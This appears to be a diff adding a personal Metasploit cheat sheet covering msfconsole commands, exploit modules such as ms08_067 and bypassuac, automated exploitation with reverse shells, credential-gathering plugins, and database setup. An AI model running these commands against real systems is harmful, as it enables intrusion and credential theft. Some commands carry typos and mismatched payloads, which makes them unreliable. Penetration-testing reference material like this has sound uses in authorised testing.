@@ -1,0 +1,210 @@
+METASPLOIT
+
+
+MSFCLI *IS DEPRICATED*
+proxychains msfcli exploit/multi/samba/usermap_script RHOST=10.11.1.111 PAYLOAD=windows/patchupmeterpreter/reverse_tcp ENABLECONTEXTENCODING=TRUE SSL=TRUE SSLCIPHPER=DHE-RSA-AES256-SHA SSLVERSION=TLS1 STAGEENCODER=shikta_ga_nai
+*INSTEAD USE*
+msfconsole -x resource file.rc
+
+
+MSFCONSOLE
+exploit -e skiata_ga_nai
+exploit -h run exploit as job
+setg fun				-set function value globally
+search pattern type:"exploit" path:"typify" platform:windows cve:2012
+sessions -l -v 			-list available sessions with verbose fields
+sessions -i 1			-interact with numbered session
+irb
+resource karma.rc		-load karmetasploit
+	use /auxiliary/server/browser_autopwn
+route					-display network routes
+db_autopwn -p -r -e 	-exploit db vulns against all ports found using a reverse shell
+db_destroy				-jic you hear sirens and your door being broken down
+hosts
+services -p 8080
+creds
+vulns
+loot
+
+
+SEARCH KEYWORDS
+  app      :  Modules that are client or server attacks  
+  author   :  Modules written by this author  
+  bid      :  Modules with a matching Bugtraq ID  
+  cve      :  Modules with a matching CVE ID  
+  edb      :  Modules with a matching Exploit-DB ID  
+  name     :  Modules with a matching descriptive name  
+  osvdb    :  Modules with a matching OSVDB ID  
+  platform :  Modules affecting this platform  
+  ref      :  Modules with a matching ref  
+  type     :  Modules of a specific type (exploit, auxiliary, or post)
+ 
+
+MODULES FOR:
+	REMOTE WINDOWS EXPLOITATION
+exploit/windows/smb/ms08_067_netapi	
+exploit/windows/dcerpc/ms06_040_netapi
+exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+	LOCAL WINDOWS EXPLOITATION
+exploit/windows/local/bypassuac
+
+
+PLUGINS:
+https://github.com/rapid7/metasploit-framework/tree/master/plugins
+load pluginname
+unload pluginname
+help pluginname
+LIST OF PLUGINS (w/ usage)
+auto_add_route
+	--automates subnet route pivoting (no commands added or taken)
+beholder
+	beholder_start
+	beholder_stop
+	beholder_conf
+db_credcollect
+	--automates credential collection && imports to database (no commands taken, commands added have been depricated)
+db_tracker
+	--hooks all socket calls && updateds msf db w/ data gathered from conn params (no commands added or taken)
+msfd
+	--provides an msf daemon interface spawning a listener on defined port (default 55554), giving each client (*!*instances spawn on this port/service are unauthenticated*!*) connection its own console interface sharing the same(as the launching) framework instance (no commands added or taken)
+msgrpc
+	--wrapper service around msfd plugin for msfrpc service on current framework instance (default port 55552), STILL UNAUTHENTICATED (no commands added or taken)
+nessus
+	nessus_help
+	nessus_connect user:pass@127.0.0.1:8834
+	nessus_save
+	nessus_login user:pass
+		--switch users on currently connected nessus instance
+	nessus_admin
+		--check if currently logged in user for currently instantiated nessus connection is admin
+	nessus_db_scan
+		--create a scan of all ip addr in db_hosts
+	nessus_db_scan_workspace
+	nessus_db_import path/to/file
+	nessus_report_hosts
+	nessus_report_host_details
+	nessus_report_vulns
+		--generate && print reporting information returned from nessus within msfconsole instance
+	nessus_policy_list
+	nessus_scan_list
+	nessus_scan_new
+	nessus_scan_launch
+	nessus_user_list
+	nessus_user_add
+	nessus_user_del
+	nessus_user_passwd
+nexpose
+	nexpose_connect user:pass@127.0.0.1:3780
+	nexpose_disconnect
+	nexpose_save
+	nexpose_discover 192.168.1.1/24
+	nexpose_scan 192.168.1.1/24
+	nexpose_exhaustive 192.168.1.1/24
+openvas
+	openvas_help
+	openvas_connect user:pass@127.0.0.1:9393
+	openvas_disconnect
+	openvas_task_list
+	openvas_task_create task
+	openvas_task_start task
+	openvas_config_list
+	openvas_format_list
+	openvas_report_list
+	openvas_report_import
+pcap_log
+	pcap_dir path/to/log/pcaps
+	pcap_iface tap0
+	pcap_filter 'insert your own damn bpf filter'
+	pcap_start
+	pcap_stop
+pentest (--non-default plugin)
+	show_client_side
+	vuln_exploit
+	discover_db
+		--execute discovery modules against db hosts
+	network_discover
+		--perform automated port scan and services enumeration for non-pivot networks
+	pivot_network_discover
+	show_session_networks
+	app_creds sess_id
+	sys_creds sess_id
+		-execute password post/*/gather/collect modules against specified session
+token_hunter
+	token_hunt_user uname
+		--scan all connected meterpreter sessions for active tokens corresponding to one or more users; useful e.g. when pivoting with domain user credentials by either replaying validated credentials or exploiting domain(AD DS/LDAP)/workgroup(NBT)-level network services (smb, rpc, kerberos, dav, MSSQL, Exchange)
+WMAP
+	wmap_sites -a https://somedomain.dom
+	wmap_sites -d https://somedomain.dom/
+	wmap_sites -l
+	wmap_targets -t https://somedomain.dom/vulnerable/index.php
+	wmap_targets -c
+		--clean/clear target sites list
+	wmap_targets -l
+	wmap_run -t
+		--show listing of all enabled wmap modules
+	wmap_run -e
+		--runs all wmap modules enabled in profile (argument for -e flag, all modules are executed if no profile file is specified) against all declared wmap_targets of wmap_sites
+	wmap_vulns -l
+		--print returned list of discovered web app vulnerabilities following wmap_run execution completion
+			--these vulns are also stored withing the msf db in table vulns and will be return by the vulns command
+xssf (--non-default plugin)
+	--really, it's 2017 beef-xss has some several hundred modules and supports proxy tunneling, which xssf never had to steal creds
+	
+
+DATABASE USAGE:
+msf>help database
+msf>db_connect user:pass@127.0.0.1/msf
+msf>db_disconnect
+msf>db_rebuild_cache
+msf>reload_all
+msf>db_status
+msf>db_import ./path/to/nmap.xml
+msf>db_nmap -A -Pn 192.168.1.1
+msf>db_export outfile.yml
+creds 192.168.1.1/24
+	--creds takes no argument for nmap-equivelant host specificiation
+hosts
+	-a --add 192.168.1.1
+	-d --delete 192.168.1.1
+	-u --up
+		--return only hosts whose status is up(live)
+	-R --rhosts
+		--set rhosts variable from results of the search
+	-S --search pattern
+loot
+	-S --search pattern
+notes
+services
+	-a --add 192.168.1.1
+	-d --delete 192.168.1.1
+	-R --rhosts
+	-S --search pattern
+vulns
+	-i --info
+		--display vuln info
+	-p --port 1-65536
+		--return results with vulnerabilites on target port or in target port range
+	-s http https
+		--list only vulns matching service name(s)
+	-R --rhosts
+	-S --search pattern
+/usr/share/metasploit-framework/msfdb
+	init	reinit	delete	start	stop
+*SET (postgresql) DATABASE user credential to (secure) non-default value*
+msf>db_disconnect
+su postgres
+psql
+psql>\c msf
+psql>createuser msfoo -P -R -S -W -d msfdb -h 127.0.0.1
+	--create user msfoo prompting for a password following command execution(-P) and for each database connection(-W) owning new database msfdb (-d), but limiting user connections to origin 127.0.0.1(-h), who a non-superuser (-S), cannot create roles (-R)
+XOR (OMITTING -d flag ergo CREATION OF A NEW DATABASE)
+	psql>ALTER DATABASE msf OWNER TO msfoo
+msf>db_connect msfoo:secretpassword@127.0.0.1/msf
+	
+METASPLOIT RPC SERVICE/daemon services
+	--metasploit's rpc service is used as an interface daemon for high-level programs (e.g. msfweb, cobalt strike, armitage) to manipulate metasploit by sharing a framework instance (thereby a db connection)
+		--importantly this allows the collaborative functionalities of advanced msf-facing programs (msfpro/cobalt strike/faraday)
+/usr/share/metasploit-framework/msfrpc
+	--metasploit rpc generic client program
+/usr/share/metasploit-framework/msfd
+	--metasploit service daemon generic client program
